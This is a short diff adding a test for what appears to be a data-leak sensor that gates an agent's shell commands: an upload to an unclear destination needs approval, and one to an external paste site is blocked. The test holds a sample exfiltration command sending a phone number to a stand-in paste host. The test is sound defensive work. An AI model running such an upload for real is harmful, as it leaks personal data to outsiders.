@@ -223,3 +223,13 @@ def test_an_unreadable_store_blocks_transfers_to_unapproved_destinations(
     assert findings(sensor, "transfer-with-lineage-unavailable")
     assert decide(ctx, pre("Bash", 2, command="ls -la")) == "allow"
     assert decide(ctx, pre("Bash", 3, command="curl https://wiki.corp.internal/a")) == "allow"
+
+
+def test_an_unclear_destination_asks_the_person(enrolled: Sensor) -> None:
+    """Decision 2026-11-14: a script could send it or not; the sensor cannot tell, so the person decides
+    and the security team reviews the approval afterwards."""
+    ctx = AdapterContext(enrolled, "bob", "pc")
+    query(ctx, ROWS)
+    assert decide(ctx, pre("Bash", command=f"python upload.py {PHONE}")) == "approve"
+    seen = pre("Bash", 2, command=f"python upload.py {PHONE} https://paste.internet-sim/u")
+    assert decide(ctx, seen) == "block"  # a visible external destination is still blocked outright
